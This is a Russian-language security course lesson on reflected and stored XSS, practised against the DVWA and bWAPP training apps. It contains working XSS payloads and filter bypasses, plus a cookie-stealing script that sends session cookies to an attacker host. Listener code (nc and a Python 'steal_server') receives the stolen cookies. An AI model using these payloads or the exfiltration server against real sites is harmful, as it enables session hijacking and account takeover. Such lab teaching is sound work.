# Занятие 20. XSS (Reflected/Stored): Практика на DVWA

## Теория

**XSS (Cross-Site Scripting)** — это уязвимость, позволяющая внедрить вредоносный JavaScript-код в страницу, которая отображается другим пользователям.

### Типы XSS

1. **Reflected XSS (Отраженный)**:
   - Скрипт передается через URL или форму
   - Не сохраняется на сервере
   - Работает только при переходе по специальной ссылке
   - Часто используется в фишинге

2. **Stored XSS (Хранимый)**:
   - Скрипт сохраняется на сервере (в БД, комментариях, профиле)
   - Выполняется при каждом просмотре страницы
   - Опаснее, так как поражает всех посетителей

3. **DOM-based XSS** (рассматривается в следующем уроке):
   - Уязвимость в клиентском JavaScript
   - Скрипт выполняется через манипуляцию DOM

### Механизм работы Reflected XSS

1. Атакующий создает ссылку с пейлоадом: `http://site.com/search?q=<script>alert(1)</script>`
2. Жертва переходит по ссылке
3. Сервер "отражает" параметр q в ответе без фильтрации
4. Браузер жертвы выполняет скрипт

### Механизм работы Stored XSS

1. Атакующий отправляет комментарий с кодом: `<script>stealCookies()</script>`
2. Сервер сохраняет комментарий в БД
3. При просмотре страницы код выполняется в браузере каждого посетителя

### Что можно сделать через XSS

- Украсть cookie сессии: `document.cookie`
- Перехватить нажатия клавиш (keylogger)
- Изменить содержимое страницы (defacement)
- Перенаправить на фишинговый сайт
- Выполнить CSRF-атаку

### Обход фильтров

| Фильтр | Обход |
|--------|-------|
| `<script>` заблокирован | `<img src=x onerror=alert(1)>` |
| `alert()` заблокирован | `<img src=x onerror=confirm(1)>` |
| Только小写 | `<IMG SRC=x ONERROR=alert(1)>` |
| Запятые | `<svg/onload=alert(1)>` |

---

## Практическое занятие

### Настройка DVWA

1. Откройте http://192.168.0.x (IP вашей VM с DVWA)
2. Установите уровень безопасности **Low** (DVWA Security)
3. Перейдите в **XSS (Reflected)**

### Практика: Reflected XSS

**Шаг 1: Базовый пейлоад**
```
<input>: <script>alert('XSS')</script>
```
Результат: всплывающее окно с текстом "XSS".

**Шаг 2: Кража cookie**
```
<input>: <script>alert(document.cookie)</script>
```
Результат: показывает cookie текущей сессии (PHPSESSID).

**Шаг 3: Перенаправление**
```
<input>: <script>window.location='http://evil.com'</script>
```
Результат: браузер перенаправляется на evil.com.

**Шаг 4: Использование img тега (обход фильтра)**
```
<input>: <img src=x onerror=alert('XSS')>
```
Результат: срабатывает обработчик onerror.

**Шаг 5: JavaScript из внешнего источника**
```
<input>: <script src="http://attacker.com/evil.js"></script>
```
(требует настроенного сервера атакующего)

### Практика: Stored XSS

Перейдите в **XSS (Stored)**.

**Шаг 1: Внедрение скрипта в гостевую книгу**
```
Name: Hacker
Message: <script>alert('Stored XSS!')</script>
```
Результат: после отправки, при каждой загрузке страницы будет всплывать alert.

**Шаг 2: Кража cookie (отправка на сервер атакующего)**
```
Message: <script>
  var img = new Image();
  img.src = 'http://192.168.0.123:4444/steal?c=' + document.cookie;
</script>
```

Для приема украденных cookie запустите слушатель (замените IP на ваш в локальной сети):
```bash
nc -lvnp 4444
```

Пример вывода при краже cookie:
```
listening on [any] 4444 ...
connect to [192.168.0.123] from (UNKNOWN) [172.17.0.2] 54321
GET /steal?c=PHPSESSID=abc123def456;%20security=low HTTP/1.1
Host: 192.168.0.123:4444
User-Agent: Mozilla/5.0...
```

**Шаг 3: Невидимый iframe**
```
Message: <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
```

### Скриншоты для отчета

1. **Скриншот 1**: Reflected XSS — всплывающее окно с alert()
2. **Скриншот 2**: Stored XSS — сообщение с скриптом в гостевой книге
3. **Скриншот 3**: Stored XSS — alert срабатывает при загрузке страницы

### Примеры вывода

**Reflected XSS — успешный пейлоад:**
```html
<!-- Исходный код ответа после ввода <script>alert('XSS')</script> -->
<pre>Hello <script>alert('XSS')</script></pre>
<div class="body_padded">
  <p>Hello <script>alert('XSS')</script></p>
</div>
```

**Stored XSS — кража cookie (запрос на сервер атакующего):**
```
GET /steal?c=PHPSESSID%3Dabc123def456%3B%20security%3Dlow HTTP/1.1
Host: 192.168.0.123:4444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Referer: http://192.168.0.x/vulnerabilities/xss_s/
```

**Ответ сервера при XSS в bWAPP:**
```html
<div id="main">
  <p>Welcome <script>alert(1)</script>!</p>
</div>
```

### Частые ошибки

1. **Пытаться выполнить XSS в адресной строке без параметра** — нужен параметр, который попадает в DOM
2. **Забыть про фильтры** — на уровне Medium `<script>` часто фильтруется, используйте `<img onerror>`
3. **Stored XSS не срабатывает** — возможно, нужно обновить страницу или проверить, сохранилось ли сообщение
4. **HttpOnly cookie** — если cookie имеет флаг HttpOnly, `document.cookie` её не вернет

### Вопросы на понимание

1. В чем разница между Reflected и Stored XSS с точки зрения жертвы?
2. Почему Stored XSS опаснее Reflected?
3. Что делает флаг HttpOnly и как он защищает от XSS?
4. Почему `<img src=x onerror=alert(1)>` работает, когда `<script>` заблокирован?

### Адаптация под macOS (M2)

```bash
# Создание простого сервера для приема украденных cookie (Python3 на macOS)
cat > steal_server.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Stolen: {self.path}")
        self.send_response(200)
        self.end_headers()
        
    def log_message(self, format, *args):
        pass  # Отключаем стандартные логи

print("[*] Listening on 0.0.0.0:4444")
HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
EOF

python3 steal_server.py
```

---


## Адаптация под macOS (M2, 8GB)

- Для установки инструментов используйте Homebrew: `brew install <tool>`
- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
- Для Python используйте `pip3 install` вместо `pip install`


## Задачи для самостоятельного выполнения

1. **Reflected XSS на уровне Low**: В DVWA (XSS Reflected) выполните пейлоады:
   - `<script>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`
   - `<svg/onload=alert(1)>`
   
   Опишите, какие сработали и какой код отображается в исходном HTML страницы.

2. **Stored XSS — кража cookie**: Настройте простой Python-сервер для приема украденных cookie:
   ```python
   from http.server import BaseHTTPRequestHandler, HTTPServer
   class Handler(BaseHTTPRequestHandler):
       def do_GET(self):
           print("Stolen:", self.path)
           self.send_response(200)
   HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
   ```
   Внедрите Stored XSS, который отправит cookie на этот сервер. Покажите в отчете, какие cookie были перехвачены.

3. **Обход фильтров на уровне Medium**: Переключите DVWA на уровень **Medium** в XSS (Reflected). Попробуйте пейлоады:
   - `<script>alert(1)</script>`
   - `<sCrIpT>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`
   
   Какой пейлоад сработал? Почему?

4. **XSS в bWAPP**: Откройте bWAPP (http://192.168.0.x), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.

5. **Cookie с флагом HttpOnly**: В DVWA (уровень Low) проверьте, есть ли у cookie флаг HttpOnly. Откройте DevTools → Application → Cookies. Если cookie доступна через `document.cookie`, значит HttpOnly отключен. Опишите, как это влияет на XSS-атаку.
